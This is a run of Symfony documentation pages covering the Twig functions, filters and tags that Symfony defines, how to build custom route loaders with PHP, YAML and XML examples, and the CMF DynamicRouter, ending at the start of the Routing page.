each possible section of your Symfony configuration.

* :doc:`framework </reference/configuration/framework>`
* :doc:`doctrine </reference/configuration/doctrine>`
* :doc:`security </reference/configuration/security>`
* :doc:`twig </reference/configuration/twig>`
* :doc:`monolog </reference/configuration/monolog>`
* :doc:`web_profiler </reference/configuration/web_profiler>`
* :doc:`debug </reference/configuration/debug>`

Forms and Validation
--------------------

* :doc:`Form Field Type Reference </reference/forms/types>`
* :doc:`Validation Constraints Reference </reference/constraints>`
* :ref:`Twig Template Function and Variable Reference <reference-form-twig-functions-variables>`

Format Specifications
---------------------

* :doc:`YAML </reference/formats/yaml>`
* :doc:`XLIFF </reference/formats/xliff>`
* :doc:`ICU MessageFormat </reference/formats/message_format>`
* :doc:`Expression Language </reference/formats/expression_language>`

Others
------

* :doc:`Configuring the Kernel </reference/configuration/kernel>`
* :doc:`Twig Extensions (forms, filters, tags, etc) Reference </reference/twig_reference>`
* :doc:`/reference/dic_tags`
* :doc:`Symfony Attributes Overview </reference/attributes>`
* :doc:`/reference/events`
Twig Extensions Defined by Symfony
==================================

:ref:`Twig <twig-language>` is the template engine used in Symfony applications.
There are tens of `default filters and functions defined by Twig`_, but Symfony
also defines some filters, functions and tags to integrate the various Symfony
components with Twig templates. This article explains them all.

.. tip::

    If these extensions provided by Symfony are not enough, you can
    :ref:`create a custom Twig extension <templates-twig-extension>` to define
    even more filters and functions.

.. _reference-twig-functions:

Functions
---------

.. _reference-twig-function-render:

render
~~~~~~

.. code-block:: twig

    {{ render(uri, options = []) }}

``uri``
    **type**: ``string`` | ``ControllerReference``
``options`` *(optional)*
    **type**: ``array`` **default**: ``[]``

Makes a request to the given internal URI or controller and returns the result.
The render strategy can be specified in the ``strategy`` key of the options.
It's commonly used to :ref:`embed controllers in templates <templates-embed-controllers>`.

.. _reference-twig-function-render-esi:

render_esi
~~~~~~~~~~

.. code-block:: twig

    {{ render_esi(uri, options = []) }}

``uri``
    **type**: ``string`` | ``ControllerReference``
``options`` *(optional)*
    **type**: ``array`` **default**: ``[]``

It's similar to the `render`_ function and defines the same arguments. However,
it generates an ESI tag when :doc:`ESI support </http_cache/esi>` is enabled or
falls back to the behavior of `render`_ otherwise.

.. tip::

    The ``render_esi()`` function is an example of the shortcut functions
    of ``render``. It automatically sets the strategy based on what's given
    in the function name, e.g. ``render_hinclude()`` will use the hinclude.js
    strategy. This works for all ``render_*()`` functions.

fragment_uri
~~~~~~~~~~~~

.. code-block:: twig

    {{ fragment_uri(controller, absolute = false, strict = true, sign = true) }}

``controller``
    **type**: ``ControllerReference``
``absolute`` *(optional)*
    **type**: ``boolean`` **default**: ``false``
``strict`` *(optional)*
    **type**: ``boolean`` **default**: ``true``
``sign`` *(optional)*
    **type**: ``boolean`` **default**: ``true``

Generates the URI of :ref:`a fragment <fragments-path-config>`.

controller
~~~~~~~~~~

.. code-block:: twig

    {{ controller(controller, attributes = [], query = []) }}

``controller``
    **type**: ``string``
``attributes`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``query`` *(optional)*
    **type**: ``array`` **default**: ``[]``

Returns an instance of ``ControllerReference`` to be used with functions
like :ref:`render() <reference-twig-function-render>` and
:ref:`render_esi() <reference-twig-function-render-esi>`.

.. _reference-twig-function-asset:

asset
~~~~~

.. code-block:: twig

    {{ asset(path, packageName = null) }}

``path``
    **type**: ``string``
``packageName`` *(optional)*
    **type**: ``string`` | ``null`` **default**: ``null``

Returns the public path of the given asset path (which can be a CSS file, a
JavaScript file, an image path, etc.). This function takes into account where
the application is installed (e.g. in case the project is accessed in a host
subdirectory) and the optional asset package base path.

Symfony provides various cache busting implementations via the
:ref:`assets.version <reference-framework-assets-version>`,
:ref:`assets.version_strategy <reference-assets-version-strategy>`,
and :ref:`assets.json_manifest_path <reference-assets-json-manifest-path>`
configuration options.

.. seealso::

    Read more about :ref:`linking to web assets from templates <templates-link-to-assets>`.

asset_version
~~~~~~~~~~~~~

.. code-block:: twig

    {{ asset_version(packageName = null) }}

``packageName`` *(optional)*
    **type**: ``string`` | ``null`` **default**: ``null``

Returns the current version of the package, more information in
:ref:`templates-link-to-assets`.

.. _reference-twig-function-csrf-token:

csrf_token
~~~~~~~~~~

.. code-block:: twig

    {{ csrf_token(intention) }}

``intention``
    **type**: ``string`` - an arbitrary string used to identify the token.

Renders a CSRF token. Use this function if you want :doc:`CSRF protection </security/csrf>`
in a regular HTML form not managed by the Symfony Form component.

is_granted
~~~~~~~~~~

.. code-block:: twig

    {{ is_granted(role, object = null, field = null) }}

``role``
    **type**: ``string``
``object`` *(optional)*
    **type**: ``object``
``field`` *(optional)*
    **type**: ``string``

Returns ``true`` if the current user has the given role.

Optionally, an object can be passed to be used by the voter. More information
can be found in :ref:`security-template`.

logout_path
~~~~~~~~~~~

.. code-block:: twig

    {{ logout_path(key = null) }}

``key`` *(optional)*
    **type**: ``string``

Generates a relative logout URL for the given firewall. If no key is provided,
the URL is generated for the current firewall the user is logged into.

logout_url
~~~~~~~~~~

.. code-block:: twig

    {{ logout_url(key = null) }}

``key`` *(optional)*
    **type**: ``string``

Equal to the `logout_path`_ function, but it'll generate an absolute URL
instead of a relative one.

path
~~~~

.. code-block:: twig

    {{ path(route_name, route_parameters = [], relative = false) }}

``name``
    **type**: ``string``
``parameters`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``relative`` *(optional)*
    **type**: ``boolean`` **default**: ``false``

Returns the relative URL (without the scheme and host) for the given route.
If ``relative`` is enabled, it'll create a path relative to the current path.

.. seealso::

    Read more about :doc:`Symfony routing </routing>` and about
    :ref:`creating links in Twig templates <templates-link-to-pages>`.

url
~~~

.. code-block:: twig

    {{ url(route_name, route_parameters = [], schemeRelative = false) }}

``name``
    **type**: ``string``
``parameters`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``schemeRelative`` *(optional)*
    **type**: ``boolean`` **default**: ``false``

Returns the absolute URL (with scheme and host) for the given route. If
``schemeRelative`` is enabled, it'll create a scheme-relative URL.

.. seealso::

    Read more about :doc:`Symfony routing </routing>` and about
    :ref:`creating links in Twig templates <templates-link-to-pages>`.

.. _reference-twig-function-absolute-url:

absolute_url
~~~~~~~~~~~~

.. code-block:: twig

    {{ absolute_url(path) }}

``path``
    **type**: ``string``

Returns the absolute URL (with scheme and host) from the passed relative path. Combine it with the
:ref:`asset() function <reference-twig-function-asset>` to generate absolute URLs
for web assets. Read more about :ref:`Linking to CSS, JavaScript and Image Assets <templates-link-to-assets>`.

.. _reference-twig-function-relative-path:

relative_path
~~~~~~~~~~~~~

.. code-block:: twig

    {{ relative_path(path) }}

``path``
    **type**: ``string``

Returns the relative path from the passed absolute URL. For example, assume
you're on the following page in your app:
``http://example.com/products/hover-board``.

.. code-block:: twig

    {{ relative_path('http://example.com/human.txt') }}
    {# ../human.txt #}

    {{ relative_path('http://example.com/products/products_icon.png') }}
    {# products_icon.png #}

expression
~~~~~~~~~~

Creates an :class:`Symfony\\Component\\ExpressionLanguage\\Expression` related
to the :doc:`ExpressionLanguage component </components/expression_language>`.

impersonation_path
~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ impersonation_path(identifier) }}

``identifier``
    **type**: ``string``

Generates a URL that you can visit to
:doc:`impersonate a user </security/impersonating_user>`, identified by the
``identifier`` argument.

impersonation_url
~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ impersonation_url(identifier) }}

``identifier``
    **type**: ``string``

It's similar to the `impersonation_path`_ function, but it generates
absolute URLs instead of relative URLs.

impersonation_exit_path
~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ impersonation_exit_path(exitTo = null) }}

``exitTo`` *(optional)*
    **type**: ``string``

Generates a URL that you can visit to exit :doc:`user impersonation </security/impersonating_user>`.
After exiting impersonation, the user is redirected to the current URI. If you
prefer to redirect to a different URI, define its value in the ``exitTo`` argument.

If no user is being impersonated, the function returns an empty string.

impersonation_exit_url
~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ impersonation_exit_url(exitTo = null) }}

``exitTo`` *(optional)*
    **type**: ``string``

It's similar to the `impersonation_exit_path`_ function, but it generates
absolute URLs instead of relative URLs.

.. _reference-twig-function-t:

t
~~~

.. code-block:: twig

    {{ t(message, parameters = [], domain = 'messages')|trans }}

``message``
    **type**: ``string``
``parameters`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``domain`` *(optional)*
    **type**: ``string`` **default**: ``messages``

Creates a ``Translatable`` object that can be passed to the
:ref:`trans filter <reference-twig-filter-trans>`.

importmap
~~~~~~~~~

Outputs the ``importmap`` & a few other items when using
:doc:`the Asset component </frontend/asset_mapper>`.

Form Related Functions
~~~~~~~~~~~~~~~~~~~~~~

The following functions related to Symfony Forms are also available. They are
explained in the article about :doc:`customizing form rendering </form/form_customization>`:

* :ref:`form() <reference-forms-twig-form>`
* :ref:`form_start() <reference-forms-twig-start>`
* :ref:`form_end() <reference-forms-twig-end>`
* :ref:`form_widget() <reference-forms-twig-widget>`
* :ref:`form_errors() <reference-forms-twig-errors>`
* :ref:`form_label() <reference-forms-twig-label>`
* :ref:`form_help() <reference-forms-twig-help>`
* :ref:`form_row() <reference-forms-twig-row>`
* :ref:`form_rest() <reference-forms-twig-rest>`
* :ref:`field_name() <reference-forms-twig-field-helpers>`
* :ref:`field_value() <reference-forms-twig-field-helpers>`
* :ref:`field_label() <reference-forms-twig-field-helpers>`
* :ref:`field_help() <reference-forms-twig-field-helpers>`
* :ref:`field_errors() <reference-forms-twig-field-helpers>`
* :ref:`field_choices() <reference-forms-twig-field-helpers>`

.. _reference-twig-filters:

Filters
-------

.. _reference-twig-humanize-filter:

humanize
~~~~~~~~

.. code-block:: twig

    {{ text|humanize }}

``text``
    **type**: ``string``

Transforms the given string into a human readable string (by replacing underscores
with spaces, capitalizing the string, etc.) It's useful e.g. when displaying
the names of PHP properties/variables to end users:

.. code-block:: twig

    {{ 'dateOfBirth'|humanize }}    {# renders: Date of birth #}
    {{ 'DateOfBirth'|humanize }}    {# renders: Date of birth #}
    {{ 'date-of-birth'|humanize }}  {# renders: Date-of-birth #}
    {{ 'date_of_birth'|humanize }}  {# renders: Date of birth #}
    {{ 'date of birth'|humanize }}  {# renders: Date of birth #}
    {{ 'Date Of Birth'|humanize }}  {# renders: Date of birth #}

.. _reference-twig-filter-trans:

trans
~~~~~

.. code-block:: twig

    {{ message|trans(arguments = [], domain = null, locale = null) }}

``message``
    **type**: ``string`` | ``Translatable``
``arguments`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``domain`` *(optional)*
    **type**: ``string`` **default**: ``null``
``locale`` *(optional)*
    **type**: ``string`` **default**: ``null``

Translates the text into the current language. More information in
:ref:`Translation Filters <translation-filters>`.

sanitize_html
~~~~~~~~~~~~~

.. code-block:: twig

    {{ body|sanitize_html(sanitizer = "default") }}

``body``
    **type**: ``string``
``sanitizer`` *(optional)*
    **type**: ``string`` **default**: ``"default"``

Sanitizes the text using the HTML Sanitizer component. More information in
:ref:`HTML Sanitizer <html-sanitizer-twig>`.

yaml_encode
~~~~~~~~~~~

.. code-block:: twig

    {{ input|yaml_encode(inline = 0, dumpObjects = false) }}

``input``
    **type**: ``mixed``
``inline`` *(optional)*
    **type**: ``integer`` **default**: ``0``
``dumpObjects`` *(optional)*
    **type**: ``boolean`` **default**: ``false``

Transforms the input into YAML syntax. See :ref:`components-yaml-dump` for
more information.

yaml_dump
~~~~~~~~~

.. code-block:: twig

    {{ value|yaml_dump(inline = 0, dumpObjects = false) }}

``value``
    **type**: ``mixed``
``inline`` *(optional)*
    **type**: ``integer`` **default**: ``0``
``dumpObjects`` *(optional)*
    **type**: ``boolean`` **default**: ``false``

Does the same as `yaml_encode() <yaml_encode>`_, but includes the type in
the output.

abbr_class
~~~~~~~~~~

.. code-block:: twig

    {{ class|abbr_class }}

``class``
    **type**: ``string``

Generates an ``<abbr>`` element with the short name of a PHP class (the
FQCN will be shown in a tooltip when a user hovers over the element).

abbr_method
~~~~~~~~~~~

.. code-block:: twig

    {{ method|abbr_method }}

``method``
    **type**: ``string``

Generates an ``<abbr>`` element using the ``FQCN::method()`` syntax. If
``method`` is ``Closure``, ``Closure`` will be used instead and if ``method``
doesn't have a class name, it's shown as a function (``method()``).

format_args
~~~~~~~~~~~

.. code-block:: twig

    {{ args|format_args }}

``args``
    **type**: ``array``

Generates a string with the arguments and their types (within ``<em>`` elements).

format_args_as_text
~~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ args|format_args_as_text }}

``args``
    **type**: ``array``

Equal to the `format_args`_ filter, but without using HTML tags.

file_excerpt
~~~~~~~~~~~~

.. code-block:: twig

    {{ file|file_excerpt(line, srcContext = 3) }}

``file``
    **type**: ``string``
``line``
    **type**: ``integer``
``srcContext`` *(optional)*
    **type**: ``integer``

Generates an excerpt of a code file around the given ``line`` number. The
``srcContext`` argument defines the total number of lines to display around the
given line number (use ``-1`` to display the whole file).

format_file
~~~~~~~~~~~

.. code-block:: twig

    {{ file|format_file(line, text = null) }}

``file``
    **type**: ``string``
``line``
    **type**: ``integer``
``text`` *(optional)*
    **type**: ``string`` **default**: ``null``

Generates the file path inside an ``<a>`` element. If the path is inside
the kernel root directory, the kernel root directory path is replaced by
``kernel.project_dir`` (showing the full path in a tooltip on hover).

format_file_from_text
~~~~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {{ text|format_file_from_text }}

``text``
    **type**: ``string``

Uses `format_file`_ to improve the output of default PHP errors.

file_link
~~~~~~~~~

.. code-block:: twig

    {{ file|file_link(line) }}

``file``
    **type**: ``string``
``line``
    **type**: ``integer``

Generates a link to the provided file and line number using
a preconfigured scheme.

file_relative
~~~~~~~~~~~~~

.. code-block:: twig

    {{ file|file_relative }}

``file``
    **type**: ``string``

It transforms the given absolute file path into a new file path relative to
project's root directory:

.. code-block:: twig

    {{ '/var/www/blog/templates/admin/index.html.twig'|file_relative }}
    {# if project root dir is '/var/www/blog/', it returns 'templates/admin/index.html.twig' #}

If the given file path is out of the project directory, a ``null`` value
will be returned.

serialize
~~~~~~~~~

.. code-block:: twig

    {{ object|serialize(format = 'json', context = []) }}

``object``
    **type**: ``mixed``

``format`` *(optional)*
    **type**: ``string``

``context`` *(optional)*
    **type**: ``array``

Accepts any data that can be serialized by the :doc:`Serializer component </serializer>`
and returns a serialized string in the specified ``format``.

.. _reference-twig-tags:

Tags
----

.. _reference-twig-tag-form-theme:

form_theme
~~~~~~~~~~

.. code-block:: twig

    {% form_theme form resources %}

``form``
    **type**: ``FormView``
``resources``
    **type**: ``array`` | ``string``

Sets the resources to override the form theme for the given form view instance.
You can use ``_self`` as resources to set it to the current resource. More
information in :doc:`/form/form_customization`.

trans
~~~~~

.. code-block:: twig

    {% trans with vars from domain into locale %}{% endtrans %}

``vars`` *(optional)*
    **type**: ``array`` **default**: ``[]``
``domain`` *(optional)*
    **type**: ``string`` **default**: ``string``
``locale`` *(optional)*
    **type**: ``string`` **default**: ``string``

Renders the translation of the content. More information in :ref:`translation-tags`.

trans_default_domain
~~~~~~~~~~~~~~~~~~~~

.. code-block:: twig

    {% trans_default_domain domain %}

``domain``
    **type**: ``string``

This will set the default domain in the current template.

.. _reference-twig-tag-stopwatch:

stopwatch
~~~~~~~~~

.. code-block:: twig

    {% stopwatch 'event_name' %}...{% endstopwatch %}

This measures the time and memory used to execute some code in the template and
displays it in the Symfony profiler. See :ref:`how to profile Symfony applications <profiling-applications>`.

.. _reference-twig-tests:

Tests
-----

The following tests related to Symfony Forms are available. They are explained
in the article about :doc:`customizing form rendering </form/form_customization>`:

* :ref:`selectedchoice() <form-twig-selectedchoice>`
* :ref:`rootform() <form-twig-rootform>`

Global Variables
----------------

app
~~~

The ``app`` variable is injected automatically by Symfony in all templates and
provides access to lots of useful application information. Read more about the
:ref:`Twig global app variable <twig-app-variable>`.

.. _`default filters and functions defined by Twig`: https://twig.symfony.com/doc/3.x/#reference
How to Create a custom Route Loader
===================================

Basic applications can define all their routes in a single configuration file -
usually ``config/routes.yaml`` (see :ref:`routing-creating-routes`).
However, in most applications it's common to import routes definitions from
different resources: PHP attributes in controller files, YAML, XML
or PHP files stored in some directory, etc.

Built-in Route Loaders
----------------------

Symfony provides several route loaders for the most common needs:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        app_file:
            # loads routes from the given routing file stored in some bundle
            resource: '@AcmeBundle/Resources/config/routing.yaml'

        app_psr4:
            # loads routes from the PHP attributes of the controllers found in the given PSR-4 namespace root
            resource:
                path: '../src/Controller/'
                namespace: App\Controller
            type: attribute

        app_attributes:
            # loads routes from the PHP attributes of the controllers found in that directory
            resource: '../src/Controller/'
            type:     attribute

        app_class_attributes:
            # loads routes from the PHP attributes of the given class
            resource: App\Controller\MyController
            type:     attribute

        app_directory:
            # loads routes from the YAML, XML or PHP files found in that directory
            resource: '../legacy/routing/'
            type:     directory

        app_bundle:
            # loads routes from the YAML, XML or PHP files found in some bundle directory
            resource: '@AcmeOtherBundle/Resources/config/routing/'
            type:     directory

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <!-- loads routes from the given routing file stored in some bundle -->
            <import resource="@AcmeBundle/Resources/config/routing.yaml"/>

            <!-- loads routes from the PHP attributes of the controllers found in the given PSR-4 namespace root -->
            <import type="attribute">
                <resource path="../src/Controller/" namespace="App\Controller"/>
            </import>

            <!-- loads routes from the PHP attributes of the controllers found in that directory -->
            <import resource="../src/Controller/" type="attribute"/>

            <!-- loads routes from the PHP attributes of the given class -->
            <import resource="App\Controller\MyController" type="attribute"/>

            <!-- loads routes from the YAML or XML files found in that directory -->
            <import resource="../legacy/routing/" type="directory"/>

            <!-- loads routes from the YAML or XML files found in some bundle directory -->
            <import resource="@AcmeOtherBundle/Resources/config/routing/" type="directory"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            // loads routes from the given routing file stored in some bundle
            $routes->import('@AcmeBundle/Resources/config/routing.yaml');

            // loads routes from the PHP attributes (#[Route(...)])
            // of the controllers found in the given PSR-4 namespace root
            $routes->import(
                ['path' => '../src/Controller/', 'namespace' => 'App\Controller'],
                'attribute',
            );

            // loads routes from the PHP attributes (#[Route(...)])
            // of the controllers found in that directory
            $routes->import('../src/Controller/', 'attribute');

            // loads routes from the PHP attributes (#[Route(...)]) of the given class
            $routes->import('App\Controller\MyController', 'attribute');

            // loads routes from the YAML or XML files found in that directory
            $routes->import('../legacy/routing/', 'directory');

            // loads routes from the YAML or XML files found in some bundle directory
            $routes->import('@AcmeOtherBundle/Resources/config/routing/', 'directory');
        };

.. note::

    When importing resources, the key (e.g. ``app_file``) is the name of the collection.
    Just be sure that it's unique per file so no other lines override it.

If your application needs are different, you can create your own custom route
loader as explained in the next section.

What is a Custom Route Loader
-----------------------------

A custom route loader enables you to generate routes based on some
conventions, patterns or integrations. An example for this use-case is the
`OpenAPI-Symfony-Routing`_ library where routes are generated based on
OpenAPI/Swagger attributes. Another example is the `SonataAdminBundle`_ that
creates routes based on CRUD conventions.

Loading Routes
--------------

The routes in a Symfony application are loaded by the
:class:`Symfony\\Bundle\\FrameworkBundle\\Routing\\DelegatingLoader`.
This loader uses several other loaders (delegates) to load resources of
different types, for instance YAML files or ``#[Route]`` attributes in controller
files. The specialized loaders implement
:class:`Symfony\\Component\\Config\\Loader\\LoaderInterface`
and therefore have two important methods:
:method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::supports`
and :method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::load`.

Take these lines from the ``routes.yaml``:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        controllers:
            resource: ../src/Controller/
            type: attribute

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="../src/Controller" type="attribute"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('../src/Controller', 'attribute');
        };

When the main loader parses this, it tries all registered delegate loaders and calls
their :method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::supports`
method with the given resource (``../src/Controller/``)
and type (``attribute``) as arguments. When one of the loader returns ``true``,
its :method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::load` method
will be called, which should return a :class:`Symfony\\Component\\Routing\\RouteCollection`
containing :class:`Symfony\\Component\\Routing\\Route` objects.

.. note::

    Routes loaded this way will be cached by the Router the same way as
    when they are defined in one of the default formats (e.g. XML, YAML,
    PHP file).

Loading Routes with a Custom Service
------------------------------------

Using a regular Symfony service is the simplest way to load routes in a
customized way. It's much easier than creating a full custom route loader, so
you should always consider this option first.

To do so, define ``type: service`` as the type of the loaded routing resource
and configure the service and method to call:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        admin_routes:
            resource: 'admin_route_loader::loadRoutes'
            type: service

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="admin_route_loader::loadRoutes" type="service"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('admin_route_loader::loadRoutes', 'service');
        };

In this example, the routes are loaded by calling the ``loadRoutes()`` method
of the service whose ID is ``admin_route_loader``. Your service doesn't have to
extend or implement any special class, but the called method must return a
:class:`Symfony\\Component\\Routing\\RouteCollection` object.

If you're using :ref:`autoconfigure <services-autoconfigure>`, your class should
implement the :class:`Symfony\\Bundle\\FrameworkBundle\\Routing\\RouteLoaderInterface`
interface to be tagged automatically. If you're **not using autoconfigure**,
tag it manually with ``routing.route_loader``.

.. note::

    The routes defined using service route loaders will be automatically
    cached by the framework. So whenever your service should load new routes,
    don't forget to clear the cache.

.. tip::

    If your service is invokable, you don't need to specify the method to use.

Creating a custom Loader
------------------------

To load routes from some custom source (i.e. from something other than attributes,
YAML or XML files), you need to create a custom route loader. This loader
has to implement :class:`Symfony\\Component\\Config\\Loader\\LoaderInterface`.

In most cases it is easier to extend from
:class:`Symfony\\Component\\Config\\Loader\\Loader` instead of implementing
:class:`Symfony\\Component\\Config\\Loader\\LoaderInterface` yourself.

The sample loader below supports loading routing resources with a type of
``extra``. The type name should not clash with other loaders that might
support the same type of resource. Make up any name specific to what
you do. The resource name itself is not actually used in the example::

    // src/Routing/ExtraLoader.php
    namespace App\Routing;

    use Symfony\Component\Config\Loader\Loader;
    use Symfony\Component\Routing\Route;
    use Symfony\Component\Routing\RouteCollection;

    class ExtraLoader extends Loader
    {
        private bool $isLoaded = false;

        public function load($resource, ?string $type = null): RouteCollection
        {
            if (true === $this->isLoaded) {
                throw new \RuntimeException('Do not add the "extra" loader twice');
            }

            $routes = new RouteCollection();

            // prepare a new route
            $path = '/extra/{parameter}';
            $defaults = [
                '_controller' => 'App\Controller\ExtraController::extra',
            ];
            $requirements = [
                'parameter' => '\d+',
            ];
            $route = new Route($path, $defaults, $requirements);

            // add the new route to the route collection
            $routeName = 'extraRoute';
            $routes->add($routeName, $route);

            $this->isLoaded = true;

            return $routes;
        }

        public function supports($resource, ?string $type = null): bool
        {
            return 'extra' === $type;
        }
    }

Make sure the controller you specify really exists. In this case you
have to create an ``extra()`` method in the ``ExtraController``::

    // src/Controller/ExtraController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class ExtraController extends AbstractController
    {
        public function extra(mixed $parameter): Response
        {
            return new Response($parameter);
        }
    }

Now define a service for the ``ExtraLoader``:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Routing\ExtraLoader:
                tags: [routing.loader]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Routing\ExtraLoader">
                    <tag name="routing.loader"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Routing\ExtraLoader;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(ExtraLoader::class)
                ->tag('routing.loader')
            ;
        };

Notice the tag ``routing.loader``. All services with this *tag* will be marked
as potential route loaders and added as specialized route loaders to the
``routing.loader`` *service*, which is an instance of
:class:`Symfony\\Bundle\\FrameworkBundle\\Routing\\DelegatingLoader`.

Using the Custom Loader
~~~~~~~~~~~~~~~~~~~~~~~

If you did nothing else, your custom routing loader would *not* be called.
What remains to do is adding a few lines to the routing configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/routes.yaml
        app_extra:
            resource: .
            type: extra

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <import resource="." type="extra"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return static function (RoutingConfigurator $routes): void {
            $routes->import('.', 'extra');
        };

The important part here is the ``type`` key. Its value should be ``extra`` as
this is the type which the ``ExtraLoader`` supports and this will make sure
its ``load()`` method gets called. The ``resource`` key is insignificant
for the ``ExtraLoader``, so it is set to ``.`` (a single dot).

.. note::

    The routes defined using custom route loaders will be automatically
    cached by the framework. So whenever you change something in the loader
    class itself, don't forget to clear the cache.

More Advanced Loaders
---------------------

If your custom route loader extends from
:class:`Symfony\\Component\\Config\\Loader\\Loader` as shown above, you
can also make use of the provided resolver, an instance of
:class:`Symfony\\Component\\Config\\Loader\\LoaderResolver`, to load secondary
routing resources.

You still need to implement
:method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::supports`
and :method:`Symfony\\Component\\Config\\Loader\\LoaderInterface::load`.
Whenever you want to load another resource - for instance a YAML routing
configuration file - you can call the
:method:`Symfony\\Component\\Config\\Loader\\Loader::import` method::

    // src/Routing/AdvancedLoader.php
    namespace App\Routing;

    use Symfony\Component\Config\Loader\Loader;
    use Symfony\Component\Routing\RouteCollection;

    class AdvancedLoader extends Loader
    {
        public function load($resource, ?string $type = null): RouteCollection
        {
            $routes = new RouteCollection();

            $resource = '@ThirdPartyBundle/Resources/config/routes.yaml';
            $type = 'yaml';

            $importedRoutes = $this->import($resource, $type);

            $routes->addCollection($importedRoutes);

            return $routes;
        }

        public function supports($resource, ?string $type = null): bool
        {
            return 'advanced_extra' === $type;
        }
    }

.. note::

    The resource name and type of the imported routing configuration can
    be anything that would normally be supported by the routing configuration
    loader (YAML, XML, PHP, attribute, etc.).

.. note::

    For more advanced uses, check out the `ChainRouter`_ provided by the Symfony
    CMF project. This router allows applications to use two or more routers
    combined, for example to keep using the default Symfony routing system when
    writing a custom router.

.. _`OpenAPI-Symfony-Routing`: https://github.com/Tobion/OpenAPI-Symfony-Routing
.. _`SonataAdminBundle`: https://github.com/sonata-project/SonataAdminBundle
.. _`ChainRouter`: https://symfony.com/doc/current/cmf/components/routing/chain.html
Looking up Routes from a Database: Symfony CMF DynamicRouter
============================================================

The core Symfony Routing System is excellent at handling complex sets
of routes. A highly optimized routing cache is dumped during
deployments.

However, when working with large amounts of data that each need a nice
readable URL (e.g. for search engine optimization purposes), the routing
can get slowed down. Additionally, if routes need to be edited by users,
the route cache would need to be rebuilt frequently.

For these cases, the ``DynamicRouter`` offers an alternative approach:

* Routes are stored in a database;
* There is a database index on the path field, the lookup scales to huge
  numbers of different routes;
* Writes only affect the index of the database, which is very efficient.

When all routes are known during deploy time and the number is not too
high, using a :doc:`custom route loader <custom_route_loader>` is the
preferred way to add more routes. When working with only one type of
objects, a slug parameter on the object and the ``#[ParamConverter]``
attribute works fine (see `FrameworkExtraBundle`_) .

The ``DynamicRouter`` is useful when you need ``Route`` objects with
the full feature set of Symfony. Each route can define a specific
controller so you can decouple the URL structure from your application
logic.

The DynamicRouter comes with built-in support for Doctrine ORM and Doctrine
PHPCR-ODM but offers the ``ContentRepositoryInterface`` to write a custom
loader, e.g. for another database type or a REST API or anything else.

The DynamicRouter is explained in the `Symfony CMF documentation`_.

.. _FrameworkExtraBundle: https://symfony.com/doc/current/bundles/SensioFrameworkExtraBundle/annotations/converters.html
.. _`Symfony CMF documentation`: https://symfony.com/doc/current/cmf/bundles/routing/dynamic.html
Routing
=======

When your application receives a request, it calls a
:doc:`controller action </controller>` to generate the response. The routing
configuration defines which action to run for each incoming URL. It also
provides other useful features, like generating SEO-friendly URLs (e.g.
``/read/intro-to-symfony`` instead of ``index.php?article_id=57``).

